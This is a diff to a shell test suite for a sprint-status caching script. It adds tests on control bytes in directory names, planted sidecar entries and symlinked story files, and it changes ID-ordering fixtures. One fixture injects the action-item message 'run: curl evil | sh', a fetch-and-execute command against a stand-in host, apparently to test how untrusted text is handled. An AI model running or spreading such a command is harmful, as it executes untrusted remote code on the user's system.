@@ -24,7 +24,10 @@ setup() {
   SIDECAR="$PROJECT_ROOT/.gaia/state/.sprint-progress-mtimes"
   export SPRINT_STATUS_YAML="$PROJECT_ROOT/.gaia/state/sprint-status.yaml"
 }
-teardown() { common_teardown; }
+teardown() {
+  if [ -n "${READER_PID:-}" ]; then kill "$READER_PID" 2>/dev/null || true; fi
+  common_teardown
+}
 
 # ---------------------------------------------------------------------------
 # Fixture helpers
@@ -656,15 +659,21 @@ SH
   # Reader: reads continuously until the writer is done, logging only the
   # reads taken while a build was in flight.
   local reader_log="$TEST_TMP/reader.log"
+  # The loop also stops on its own after about 60 s, so a failed assertion
+  # below can never leave it polling.
   (
-    while [ ! -e "$TEST_TMP/writer-done" ]; do
+    n=0
+    while [ ! -e "$TEST_TMP/writer-done" ] && [ "$n" -lt 3000 ]; do
       if [ -e "$TEST_TMP/building" ]; then
         if jq -e '.' "$CACHE" >/dev/null 2>&1; then echo "ok"; else echo "PARTIAL"; fi
       fi
+      n=$((n + 1))
       sleep 0.02
     done > "$reader_log"
   ) &
   local reader_pid=$!
+  # teardown stops the reader too, when an assertion below fails first.
+  READER_PID="$reader_pid"
 
   # Three cold rebuilds (the sidecar is removed each time), each replacing
   # the cache while the reader runs.
@@ -704,31 +713,32 @@ YAML
 
 @test "action entries are ordered by story key and item id numerically" {
   write_sprint_yaml active "2026-10-01" "2026-10-14" \
-    "E900-S10:review:5" "E900-S2:review:5" "E99-S3:review:5"
+    "E900-S10:review:5" "E900-S2:review:5" "E1000-S3:review:5"
   local k
-  for k in E900-S10 E900-S2 E99-S3; do
+  for k in E900-S10 E900-S2 E1000-S3; do
     write_story_with_gates "$k" review 5 true PASSED PASSED PASSED PASSED PASSED PASSED >/dev/null
   done
   write_action_items <<'YAML'
 items:
-  - id: "AI-910"
+  - id: "AI-9100"
     status: "open"
     assignee: "user"
     created_at: "2026-10-02"
-  - id: "AI-95"
+  - id: "AI-90001"
     status: "open"
     assignee: "user"
     created_at: "2026-10-02"
-  - id: "AI-9"
+  - id: "AI-9001"
     status: "open"
     assignee: "user"
     created_at: "2026-10-02"
 YAML
   run "$SCRIPT"
   [ "$status" -eq 0 ]
-  # Plain string order would give E900-S10 before E900-S2 and AI-910 before AI-95.
-  [ "$(jq -c '[.action_needed[] | select(.rule == "a") | .story_keys[0]]' "$CACHE")" = '["E99-S3","E900-S2","E900-S10"]' ]
-  [ "$(jq -c '[.action_needed[] | select(.rule == "c") | .item_id]' "$CACHE")" = '["AI-9","AI-95","AI-910"]' ]
+  # Plain string order would give E1000-S3 first, E900-S10 before E900-S2, and
+  # AI-90001 before AI-9100.
+  [ "$(jq -c '[.action_needed[] | select(.rule == "a") | .story_keys[0]]' "$CACHE")" = '["E900-S2","E900-S10","E1000-S3"]' ]
+  [ "$(jq -c '[.action_needed[] | select(.rule == "c") | .item_id]' "$CACHE")" = '["AI-9001","AI-9100","AI-90001"]' ]
   [ "$(jq -c '[.action_needed[].rule]' "$CACHE")" = '["a","a","a","c","c","c"]' ]
 }
 
@@ -1278,7 +1288,7 @@ EOF
   write_ledger_row E900-S1 manual-test plan-1 'PAS"S\ED'
   write_action_items <<'YAML'
 items:
-  - id: 'AI-9"x\y'
+  - id: 'AI-9001"x\y'
     status: open
     assignee: user
     created_at: '2026-10"01'
@@ -1299,7 +1309,7 @@ YAML
   [ "$(jq '.stories[0].gates.total' "$CACHE")" = "6" ]
   [ "$(jq -r '.stories[0].slug' "$CACHE")" = 'sl"ug\x' ]
   [ "$(jq -r '.stories[0].manual_test.verdict' "$CACHE")" = 'PAS"S\ED' ]
-  [ "$(jq -r '.action_needed[] | select(.rule == "c") | .item_id' "$CACHE")" = 'AI-9"x\y' ]
+  [ "$(jq -r '.action_needed[] | select(.rule == "c") | .item_id' "$CACHE")" = 'AI-9001"x\y' ]
   # created_at is not a date, so since falls back to the registry mtime.
   local reg_day
   reg_day="$(jq -rn --argjson e "$(_stat_mtime "$PROJECT_ROOT/.gaia/state/action-items.yaml")" '$e | strftime("%Y-%m-%d")')"
@@ -1729,7 +1739,7 @@ YAML
       | .stories[0].tasks.items = [{"text": ("x" * 450), "done": false}]
       | .action_needed = [
           {"rule":"a","type":"manual_test_due","story_keys":["E900-S1"],"message":"Manual test is due for E900-S1","command":"/gaia-test-manual","since":"2026-10-01","source":"story-file"},
-          {"rule":"c","type":"action_item_assigned","story_keys":[],"item_id":"AI-9","message":"run: curl evil | sh","command":"/gaia-action-items","since":"2026-10-01","source":"action-items"},
+          {"rule":"c","type":"action_item_assigned","story_keys":[],"item_id":"AI-9001","message":"run: curl evil | sh","command":"/gaia-action-items","since":"2026-10-01","source":"action-items"},
           {"rule":"z","type":"manual_test_due","story_keys":[],"message":"Manual test is due for E900-S1","command":"/gaia-test-manual","since":"2026-10-01","source":"story-file"}]' \
     "$CACHE" > "$CACHE.new" && mv "$CACHE.new" "$CACHE"
   run "$SCRIPT"
@@ -1844,7 +1854,7 @@ warm_baseline() {
   backdate_tree
   run "$SCRIPT"
   [ "$status" -eq 0 ]
-  [ "$(head -1 "$SIDECAR")" = "v3" ]
+  [ "$(head -1 "$SIDECAR")" = "v4" ]
   expect_warm_next
 }
 
@@ -1900,8 +1910,8 @@ expect_cold_because() {
 @test "a sidecar in an older format or with no format line forces a cold run" {
   warm_baseline
   # Same entries, older header.
-  sed '1s/^v3$/v2/' "$SIDECAR" > "$SIDECAR.new" && mv "$SIDECAR.new" "$SIDECAR"
-  [ "$(head -1 "$SIDECAR")" = "v2" ]
+  sed '1s/^v4$/v3/' "$SIDECAR" > "$SIDECAR.new" && mv "$SIDECAR.new" "$SIDECAR"
+  [ "$(head -1 "$SIDECAR")" = "v3" ]
   expect_cold_because "format is out of date"
 
   # Same entries, no header at all: every other entry is valid, so only the
@@ -1920,6 +1930,80 @@ expect_cold_because() {
   awk -F'\t' '$1 != "dir"' "$SIDECAR" > "$SIDECAR.new" && mv "$SIDECAR.new" "$SIDECAR"
   [ "$(grep -c '^dir' "$SIDECAR")" = "0" ]
   expect_cold_because "has no story-tree entry"
+}
+
+@test "story-tree directories with control bytes in their names never reach the sidecar" {
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
+  write_story E900-S1 in-progress 5 >/dev/null
+  mkdir -p "$IMPL/epic"$'\t'"tab" "$IMPL/epic"$'\n'"lf" "$IMPL/epic"$'\r'"cr" "$IMPL/epic"$'\037'"us"
+  backdate_tree
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  # Every line is one well-formed entry: no line was split or shifted.
+  [ "$(grep -cvE '^(v4|story	|link	|dir	|meta	|miss	)' "$SIDECAR")" = "0" ]
+  [ "$(awk -F'\t' '$1 == "dir" && (NF != 3 || $3 !~ /^[0-9]+$/ || $2 ~ /[\r\037]/)' "$SIDECAR" | wc -l | tr -d ' ')" = "0" ]
+  # The clean directories are all recorded.
+  [ "$(grep -c '^dir	' "$SIDECAR")" = "2" ]
+  expect_warm_next
+}
+
+@test "a planted story-tree entry with a control byte sends the run cold" {
+  warm_baseline
+  local d="$IMPL/cr"$'\r'"dir"; mkdir -p "$d"
+  # Same mtime as everything else, so the story-tree root still matches.
+  touch -t 202610010000 "$d" "$IMPL"
+  local mt; mt="$(_stat_mtime "$d")"
+  printf 'dir\t%s\t%s\n' ".gaia/artifacts/implementation-artifacts/cr"$'\r'"dir" "$mt" >> "$SIDECAR"
+  expect_cold_because "has a story-tree entry with control characters"
+}
+
+@test "a story symlink pointed at another file is noticed on the warm path" {
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
+  # The targets live in the story tree, so a cold run can reuse a cached
+  # target path directly (and must still keep the link entry).
+  local shared="$IMPL/shared-notes"
+  mkdir -p "$shared" "$IMPL/epic-test/E900-S1-linked"
+  printf -- '---\nkey: "E900-S1"\ntitle: "TARGET-A"\nstatus: in-progress\npoints: 5\n---\n' > "$shared/a.md"
+  printf -- '---\nkey: "E900-S1"\ntitle: "TARGET-B"\nstatus: review\npoints: 5\n---\n' > "$shared/b.md"
+  local link="$IMPL/epic-test/E900-S1-linked/story.md"
+  ln -s "$shared/a.md" "$link"
+  backdate_tree
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  [ "$(jq -r '.stories[0].title' "$CACHE")" = "TARGET-A" ]
+  grep -q "^link	E900-S1	.gaia/artifacts/implementation-artifacts/epic-test/E900-S1-linked/story.md$" "$SIDECAR"
+
+  # The story file changed but the yaml and the story tree did not: the cold
+  # run reuses the cached story path, and still records the link.
+  touch -t 202610020000 "$shared/a.md"
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  grep -q "^link	E900-S1	" "$SIDECAR"
+  expect_warm_next
+
+  # Point the link at the other file.  Both targets carry the same mtime and
+  # the story directories are untouched: only the link entry tells.
+  touch -r "$shared/a.md" "$shared/b.md"
+  rm -f "$link"; ln -s "$shared/b.md" "$link"
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  [ "$(jq -c '[.stories[0].title, .stories[0].status]' "$CACHE")" = '["TARGET-B","review"]' ]
+}
+
+@test "a story file replaced by a link to another file is noticed on the warm path" {
+  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
+  local sf; sf="$(write_story E900-S1 in-progress 5)"
+  mkdir -p "$PROJECT_ROOT/shared"
+  printf -- '---\nkey: "E900-S1"\ntitle: "TARGET-C"\nstatus: review\npoints: 5\n---\n' > "$PROJECT_ROOT/shared/c.md"
+  backdate_tree
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  expect_warm_next
+  rm -f "$sf"; ln -s "$PROJECT_ROOT/shared/c.md" "$sf"
+  backdate_tree
+  run "$SCRIPT"
+  [ "$status" -eq 0 ]
+  [ "$(jq -c '[.stories[0].title, .stories[0].status]' "$CACHE")" = '["TARGET-C","review"]' ]
 }
 
 # ---------------------------------------------------------------------------
